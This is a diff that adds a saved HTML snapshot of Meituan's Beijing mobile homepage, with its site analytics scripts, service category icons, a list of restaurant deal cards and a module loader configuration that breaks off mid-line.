@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <!--<link href="//p0.meituan.net" rel="dns-prefetch">
+    <link href="//p1.meituan.net" rel="dns-prefetch">
+    <link href="//ms0.meituan.net" rel="dns-prefetch">-->
+<script>
+        ;(function(pageId){'use strict';var referrer=document.referrer,url=window.location.href,organic,encode=encodeURIComponent,decode=decodeURIComponent;if(referrer&&url.indexOf('utm_source=')===-1){organic=packOrganic(referrer,pageId);if(organic)redirect(organic)}function packOrganic(url,page){var pos=url.lastIndexOf('?'),match,host,query,i,len,item,searchEngines=[['m.baidu','wd','w'],['wap.baidu','wd','w'],['Baidu','bs'],['www.soso','w'],['wap.soso','key'],['www.sogou','query'],['wap.sogou','keyword'],['so.com','q'],['so.com','pq'],['youdao','q'],['sm.cn','q']];match=url.match(/(?:\/\/)([^:\/?#]*)/);if(match){host=match[1];if(host.indexOf('meituan.com')>-1)return null;query=parse(url.substring(pos+1));for(i=0,len=searchEngines.length;i<len;++i){item=searchEngines[i];if(item[2]){var judge=host.indexOf(item[0])>-1&&(query.hasOwnProperty(item[1])||query.hasOwnProperty(item[2]))}else{var judge=host.indexOf(item[0])>-1&&query.hasOwnProperty(item[1])}var pid=pageId||'100000';if(judge){return{'utm_campaign':item[0],'utm_medium':'organic','utm_source':item[0],'utm_content':page,'utm_term':encode(query[item[1]]),'pageId':pid}}}}return null}function redirect(params){var queries=[],p;for(p in params){if(params.hasOwnProperty(p))queries.push(encode(p)+'='+encode(params[p]))}window.location.href=url+(url.indexOf('?')===-1?'?':'&')+queries.join('&')}function parse(q){var ret={},i,len,pair;if(q){q=q.split('&');for(i=0,len=q.length;i<len;++i){pair=q[i].split('=');ret[decode(pair[0])]=pair[1]?decode(pair[1]):''}}return ret}})(100001);
+</script>	<link rel="canonical" href="//bj.meituan.com">
+<title>美团网</title>
+<meta name="meituan_check"/>
+<meta name="applicable-device" content="mobile">
+<meta name="viewport" content="initial-scale=1, width=device-width, maximum-scale=1, user-scalable=no">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name='apple-touch-fullscreen' content='yes'>
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<!--<link rel="apple-touch-icon-precomposed" sizes="57x57"
+      href="//ms0.meituan.net/touch/img/startup/apple-touch-icon-57x57-precomposed.png">
+<link rel="apple-touch-icon-precomposed" sizes="120x120"
+      href="//ms0.meituan.net/touch/img/startup/apple-touch-icon-120x120-precomposed.png">
+<link rel="apple-touch-icon-precomposed" sizes="196x196"
+      href="//ms0.meituan.net/touch/img/startup/apple-touch-icon-196x196-precomposed.png">
+<link rel="apple-touch-startup-image"
+      href="//ms0.meituan.net/touch/img/startup/apple-touch-startup-image-640x1096.png"
+      media="(device-height:568px)">
+<link rel="apple-touch-startup-image"
+      href="//ms0.meituan.net/touch/img/startup/apple-touch-startup-image-640x920.png"
+      media="(device-height:480px)">-->
+<meta name="format-detection" content="telephone=no">
+<meta name="format-detection" content="address=no">
+<!--<meta name="for" content="meituan.com">-->
+
+<!--<script>
+    var MT=MT||{};MT.HTTP_REFERER="";MT.pageData={pid:"100001",newUser:true,pc:"cateid=1%2C99%2C20%2C2%2C394%2C10%2C195%2C22%2C36%2C20,066%2C3%2C0%2C52%2C11%2C20,007%2C20,285%2C20,178%2C20,179%2C27%2C-1%2C&hasGuide=true",sid:"dx-mobile-touch20.dx.sankuai.com",st:"1495631537645",cip:"114.249.234.202",setPC:function(v){v=v||"";if(Object.prototype.toString.call(v)=="[object Object]"){var a=[];for(i in v){a.push(i+"="+v[i])}this.pc=a.join("&")}else{this.pc=v}}};MT.TimeTracker={rt:1495631537645,st:Date.now()};window.addEventListener("load",function(){MT.TimeTracker.lt=Date.now()});document.addEventListener("DOMContentLoaded",function(e){MT.TimeTracker.dt=Date.now()});MT.log={_logs:[],send:function(t,v,s){this._logs.push({type:t,value:v,sampling:s})}};var requirejs={};requirejs.__require=[];var require=function(){requirejs.__require.push(arguments)};
+</script>-->
+
+<style>
+    @font-face {
+        font-family: 'cate_icon';
+        src: url(//ms0.meituan.net/touch/css/i/fonts/cate4.woff?v7) format("woff"), url(//ms0.meituan.net/touch/css/i/fonts/cate4.otf?v7); }
+    @font-face {
+        font-family: 'base_icon';
+        src: url(//ms0.meituan.net/touch/css/i/fonts/base14.woff) format("woff"), url(//ms0.meituan.net/touch/css/i/fonts/base14.otf); }
+
+</style>
+<script>
+    if (!window.Analytics) {
+        !function(e,n,t,o){function r(){return a._LXALogNTObject?"hybrid":o?o:/\b(mobile|iphone|htc)\b/gi.test(b)?"mobile":"web"}var a=window,i=document,c="_MeiTuanALogObject";if(a[c]=t,!a[t]){var s=function(){return s.q.push(arguments),s};s.q=s.q||[],s.v=n,s.l=+new Date,s.C=o,a[t]=a[t]||s;var u=i.getElementsByTagName("head")[0],l=i.createElement("script"),b=navigator.userAgent.toLocaleLowerCase(),g=r(),d="";d=e.length-3===e.indexOf(".js")?e:["//",e,"/source/",n,"/",g,".","js"].join(""),l.defer=l.async=!0,l.charset="utf-8",l.src=d,l.onload=l.onerror=function(){},u.appendChild(l)}}("analytics.meituan.net","stable","Analytics","");
+        (function(Analytics){
+            if (Analytics) {
+                Analytics('config', 'appnm', 'imt');
+                Analytics('use', 'group');
+                var val = {pid: 'index'};
+                Analytics('send', 'pv', { cid: '100001' , val: val });
+            }
+        }(window.Analytics));
+    }
+</script>
+        <link href="//ms0.meituan.net/touch/css/eve.e1a7da95.css" rel="stylesheet" onload="MT.pageData.eveTime=Date.now()"/>
+<link href="//ms0.meituan.net/touch/css/iconfont/iconfont.6dae7b05.css" rel="stylesheet"/>
+<link href="//ms0.meituan.net/touch/css/index.6f9e5c98.css" rel="stylesheet" onload="MT.pageData.eveTime=Date.now()"/>
+
+
+
+<script>
+    !function(e,t,n){function s(){var e=t.createElement("script");e.async=!0,e.src="https://s0.meituan.net/bs/js/?f=mta-js:mta.min.js";;var n=t.getElementsByTagName("script")[0];n.parentNode.insertBefore(e,n)}if(e.MeituanAnalyticsObject=n,e[n]=e[n]||function(){(e[n].q=e[n].q||[]).push(arguments)},"complete"===t.readyState)s();else{var r="addEventListener",i="attachEvent";if(e[r])e[r]("load",s,!1);else if(e[i])e[i]("onload",s);else{var a=e.onload;e.onload=function(){s(),a&&a()}}}}(window,document,"mta");
+
+    // 初始化项目
+    mta("create","5742deda57960be76e15ef6a");
+    // 推荐设置上报地址为 HTTPS 协议，以获得更高的数据准确性，默认会和页面协议一致
+    mta("config", "beaconImage", "https://frep.meituan.com/_.gif");
+    // 发送页面性能指标，包括 ttfb（首字节）、domReady（可交互）、load（完全加载）等
+    mta('send', 'page');
+</script>
+
+<script>
+    if (!window.Analytics) {
+        !function(e,n,t,o){function r(){return a._LXALogNTObject?"hybrid":o?o:/\b(mobile|iphone|htc)\b/gi.test(b)?"mobile":"web"}var a=window,i=document,c="_MeiTuanALogObject";if(a[c]=t,!a[t]){var s=function(){return s.q.push(arguments),s};s.q=s.q||[],s.v=n,s.l=+new Date,s.C=o,a[t]=a[t]||s;var u=i.getElementsByTagName("head")[0],l=i.createElement("script"),b=navigator.userAgent.toLocaleLowerCase(),g=r(),d="";d=e.length-3===e.indexOf(".js")?e:["//",e,"/source/",n,"/",g,".","js"].join(""),l.defer=l.async=!0,l.charset="utf-8",l.src=d,l.onload=l.onerror=function(){},u.appendChild(l)}}("analytics.meituan.net","stable","Analytics","");
+        (function(Analytics){
+            if (Analytics) {
+                Analytics('config', 'appnm', 'imt');
+                Analytics('use', 'group');
+                var val = {pid: 'index'};
+                Analytics('send', 'pv', { cid: '100001' , val: val });
+            }
+        }(window.Analytics));
+    }
+</script>
+
+</head>
+<body id="index" data-com="pagecommon"  data-page-id="100001"  data-iswebview='false' >
+        <header  class="navbar">
+            <div class="nav-wrap-left">
+                <a gaevent="imt/hd/cityBottom" href="#" class="react">
+                    <span class="nav-city">北京<space></space><i class="text-icon icon-downarrow"></i></span>
+                </a>
+            </div>
+
+                <div class="box-search">
+                    <a gaevent="imt/homepage/search" class="react" href="#">
+	                    <i class="icon-search text-icon">⌕</i>
+	                    <span class="single-line">
+	                    			输入商家/品类/商圈
+	                    	</span>
+                    </a>
+                </div>
+                <div class="nav-wrap-right">
+                    <a class="react"  gaevent="imt/homepage/mine" rel="nofollow" href="#">
+                    <span class="nav-btn">
+                        <i class="text-icon">⍥</i>我的
+                    </span>
+                    </a>
+                </div>
+        </header>
+
+
+
+	
+<dl class="list list-in">
+<dd class="icon-wrapper"  >
+<ul class="icon-list page current">
+    <li class="icon">
+                    <a style="display:block"  gaevent="imt/homepage/category1/1" data-stid_b="1" href="#">
+                <span class="new-icon-circle iconfont meishi" style="background: #fd9d21"></span>
+        <span class="icon-desc">美食</span></a>
+    <li class="icon">
+                    <a style="display:block"  gaevent="imt/homepage/category1/99" data-stid_b="1" href="#">
+                <span class="new-icon-circle iconfont dianying" style="background: #ff6767"></span>
+        <span class="icon-desc">猫眼电影</span></a>
+    <li class="icon">
+            <a style="display:block"  gaevent="imt/homepage/category1/20" href="#" data-stid_b="1">
+                <span class="new-icon-circle iconfont jiudian" style="background: #8a90fa"></span>
+        <span class="icon-desc">酒店</span></a>
+    <li class="icon">
+                    <a style="display:block"  gaevent="imt/homepage/category1/2" data-stid_b="1"
+                   href="#">
+                <span class="new-icon-circle iconfont xiuxianyule" style="background: #fed030"></span>
+        <span class="icon-desc">休闲娱乐</span></a>
+    <li class="icon">
+            <a style="display:block"  gaevent="imt/homepage/category1/394" href="#" data-stid_b="1">
+                <span class="new-icon-circle iconfont waimai" style="background: #fd9d21"></span>
+        <span class="icon-desc">外卖</span></a>
+    <li class="icon">
+                    <a style="display:block"  gaevent="imt/homepage/category1/10" data-stid_b="1"
+                   href="#">
+                <span class="new-icon-circle iconfont ktv" style="background: #fed030"></span>
+        <span class="icon-desc">KTV</span></a>
+    <li class="icon">
+            <a style="display:block"  gaevent="imt/homepage/category1/195" href="#" data-stid_b="1">
+                <span class="new-icon-circle iconfont zhoubianyou" style="background: #4dc6ee"></span>
+        <span class="icon-desc">周边游</span></a>
+    <li class="icon">
+            <a style="display:block"  gaevent="imt/homepage/category1/22" href="#">
+                <span class="new-icon-circle iconfont liren" style="background: #ff80c2"></span>
+        <span class="icon-desc">丽人</span></a>
+    <li class="icon">
+                    <a style="display:block"  gaevent="imt/homepage/category1/36" data-stid_b="1"
+                   href="#">
+                <span class="new-icon-circle iconfont xiaochikuaican" style="background: #fd9d21"></span>
+        <span class="icon-desc">小吃快餐</span></a>
+    <li class="icon">
+            <a style="display:block"  gaevent="imt/homepage/category1/20066"  href="#">
+                <span class="icon-circle typeid20066"  style="background: #599eec">
+                    火
+                </span>
+        <span class="icon-desc">机票/火车票</span></a>
+        </ul><ul class="icon-list page next">
+    <li class="icon">
+            <a style="display:block"  gaevent="imt/homepage/category2/3" href="#">
+                <span class="icon-circle typeid3"  style="background: #A8DD99">
+                    活
+                </span>
+        <span class="icon-desc">生活服务</span></a>
+    <li class="icon">
+                    <a style="display:block"  gaevent="imt/homepage/category2/0" data-stid_b="1"
+                   href="#">
+                <span class="new-icon-circle iconfont jinrixindan" style="background: #00d3be"></span>
+        <span class="icon-desc">今日新单</span></a>
+    <li class="icon">
+                    <a style="display:block"  gaevent="imt/homepage/category2/52" data-stid_b="1"
+                   href="#">
+                <span class="new-icon-circle iconfont zuliao" style="background: #fed030"></span>
+        <span class="icon-desc">足疗按摩</span></a>
+    <li class="icon">
+                    <a style="display:block"  gaevent="imt/homepage/category2/11" data-stid_b="1"
+                   href="#">
+                <span class="new-icon-circle iconfont yinliaoxiaochi" style="background: #fd9d21"></span>
+        <span class="icon-desc">甜点饮品</span></a>
+    <li class="icon">
+            <a style="display:block"  gaevent="imt/homepage/category2/20007" href="#">
+                <span class="icon-circle typeid20007"  style="background: #ff80c2">
+                    子
+                </span>
+        <span class="icon-desc">母婴亲子</span></a>
+    <li class="icon">
+                    <a style="display:block"  gaevent="imt/homepage/category2/20285" data-stid_b="1"
+                   href="#">
+                <span class="icon-circle typeid20285"  style="background: #84d23d">
+                    学
+                </span>
+        <span class="icon-desc">学习培训</span></a>
+    <li class="icon">
+            <a style="display:block"  gaevent="imt/homepage/category2/20178"  href="#">
+                <span class="icon-circle typeid20178"  style="background: #ff80c2">
+                    婚
+                </span>
+        <span class="icon-desc">结婚</span></a>
+    <li class="icon">
+                    <a style="display:block"  gaevent="imt/homepage/category2/20179" data-stid_b="1"
+                   href="#">
+            <img class="icon-circle" src="//p1.meituan.net/jungle/c6dea00274ef4f2e64d65646dce9c7061099.png"/>
+        <span class="icon-desc">家装</span></a>
+    <li class="icon">
+                    <a style="display:block"  gaevent="imt/homepage/category2/27" data-stid_b="1"
+                   href="#">
+                <span class="icon-circle typeid27"  style="background: #a7dc98">
+                    车
+                </span>
+        <span class="icon-desc">汽车服务</span></a>
+    <li class="icon">
+            <a style="display:block"  gaevent="imt/homepage/category2/99999" href="#">
+                <span class="new-icon-circle iconfont quanbu" style="background: #00d3be"></span>
+        <span class="icon-desc">全部分类</span></a>
+</ul>
+        <ul class="list-ico list">
+            <li class="active"></li>
+            <li class=""></li>
+        </ul>
+</dd>
+</dl>
+
+
+<div id="guessLike" class="guess-like">
+    <dl class="list">
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/43164437">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">吉野家</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/26381564">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">老北京炸酱面</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/29304776">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">第一佳大鸡排</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/38113267">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">第一香猪蹄</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/36545157">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">马兰拉面</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/31355249">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">蜜菓の蜜制鲜饮</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/44788484">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">真功夫</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/40258272">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">水平有限螺蛳粉</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/30355897">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">桥头排骨&呆萌主义</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/31971268">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">奶茶嫁给粉</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/25192707">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">掉香缘掉渣饼</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/33966502">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">川成元麻辣香锅</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/1955354">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">食字街区</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/33234301">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">唇辣号重庆老火锅</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/41724343">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">簋街龙虾庄</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/33825838">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">8090烤鱼</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/44580276">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">刀小蛮半只鸡云南米线</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/27155520">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">悦园餐厅</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/37729410">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">郑文琪龙虾盖浇饭</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/37976060">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">老诚一锅</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/43873976">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">旺池川菜</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/17954208">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">零度空间</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//i.meituan.com/deal/43700543.html">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">唱吧麦颂量贩式KTV</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/28396152">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">比格比萨</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/38732338">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">成都驻京办餐厅</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//i.meituan.com/deal/34517046.html">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">卡乐文娱电玩城（西单店）</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/40416660">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">BON CAKE</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/42491677">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">豆捞坊</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/34145029">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">壹佳烤猪蹄</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+            <dd>
+                <a class="react" href="//meishi.meituan.com/i/deal/45042107">
+                    <div class="dealcard">
+                        <div class="dealcard-img imgbox"></div>
+                        <div class="dealcard-block-right">
+                            <div class="dealcard-brand single-line">弄堂里</div>
+                            <div class="price">
+                                <span class="strong"></span><span class="strong-color"></span>
+                                <del></del>
+                                <span class="line-right">
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </dd>
+        <dd class="db">
+            <a class="react "
+               href="//i.meituan.com/beijing"
+               data-stid_b="4" gaevent="imt/homepage/allcate">
+                <div class="more">查看全部团购</div>
+            </a>
+        </dd>
+    </dl>
+
+</div>
+
+    <footer>
+        <div class="footer-bar">
+                <div class="pull-right">
+                   
+        </div>
+        <div class="footer-nav">
+           
+        </div>
+            
+        <div class="footer-copyright">
+        
+    </footer>
+    <div class="top-btn" data-com="gotop" gaevent="imt/ft/backtotop"><a class="react"><i class="text-icon">⇧</i></a></div>
+
+<!--<script>
+    require(['page/index.js','common/dau.js','amd_pop_i2app_activity.js'], function (Page,dau,popActivity) {
+        /**
+         * 在金立浏览器和QQ浏览器中打开首页,尝试唤醒APP
+         */
+        var reg = /GIONEE|MQQBrowser/i;//正则匹配容器是金立浏览器或者QQ浏览器
+        if (navigator.userAgent.match(reg)) {//如果正则匹配成功
+            var mtlaunch = "ihome";
+            setTimeout(function () {
+                var href = dau({lch: mtlaunch});
+                if (href) {
+                    window.location.href = href;
+                }
+            }, 500);
+        }
+
+        Page.init({
+            cityId:1,
+            BannerList: []
+        });
+        //客户端下载弹层
+    window.closeBanner && window.closeBanner();
+
+        //活动弹窗
+        popActivity();
+    });
+</script>-->
+    <script>
+        var host = location.host.split('.')[0]
+        //host 可能的值: i, i0~i9, test
+        if(host && host[1] && host[1]!= '5') {
+            //有子域名, 但不是i5的情况下,
+            requirejs.__requirejsConfig = {
+                    baseUrl: '//ms0.meituan.net/',
+                    prefix: '/touch/module/'
+            }
+        } else {
+            requirejs.__requirejsConfig = {
+                baseUrl: document.location.protocol + '//ms0.meituan.net/',
+                prefix: 'touch/module/',
+                        revision: {"amd_common/iframeResizer.contentWindow.js":"7a384990","amd_pop_i2app_activity.js":"201ba1cc","amd_pop_i2app_v2.js":"6e1d69de","amd_pop_v2.js":"a400cc1b","com/adsclickreq.js":"22ff36f9","com/album.js":"47e7551f","com/captcha.js":"cd32c82d","com/collect.js":"567397fe","com/countdown.js":"78525c2b","com/downloadBanner.js":"c678a5b1","com/dropdown.js":"b2b310b4","com/event/expandMore.js":"51547324","com/gallery.js":"53aa79b3","com/gotop.js":"ba58c072","com/hongbao.js":"d2096128","com/i2app.js":"eeccb716","com/jsBridge.js":"41c9a51c","com/knb.js":"8f821895","com/lazyLoad.js":"2700e1b9","com/locdist.js":"62c671f0","com/magicCard.js":"07ef3087","com/nativeSearch.js":"d6be31fa","com/opendownload.js":"24f6fd96","com/pagecommon.js":"98d55c38","com/phonecall.js":"5ea4d45c","com/radioarea.js":"3e4076dd","com/redirect.js":"28aad7ce","com/room_status.js":"4d2dad07","com/selector.js":"64d2080c","com/share.js":"cc6f52af","com/smsBtn.js":"f9cb10c1","com/stepper.js":"188410ba","com/sticky.js":"fd03b4ba","com/tab.js":"fb8c29c4","com/toggleClass.js":"417773a7","com/unveil.js":"8c98baf5","com/verify_err_handle.js":"c7d0d125","com/weixin-share.js":"d0af0ee6","com/weixintip.js":"05404403","common/banner.js":"001d0fe5","common/checkPosi.js":"d809446e","common/checkWebp.js":"c86b0791","common/countUp.js":"686a9699","common/datepicker.js":"d4070f2f","common/datepicker_hotel.js":"5610c6ff","common/dateselect.js":"ebae9131","common/dau.js":"fd540c76","common/filter.js":"abe76c00","common/handleError.js":"b2426b69","common/httpsMta.js":"c1a1f30a","common/iframeResizer.js":"8dc7f8ae","common/iscroll-v5.1.3.js":"4ea84841","common/iscroll.js":"cd053c97","common/islide.js":"4d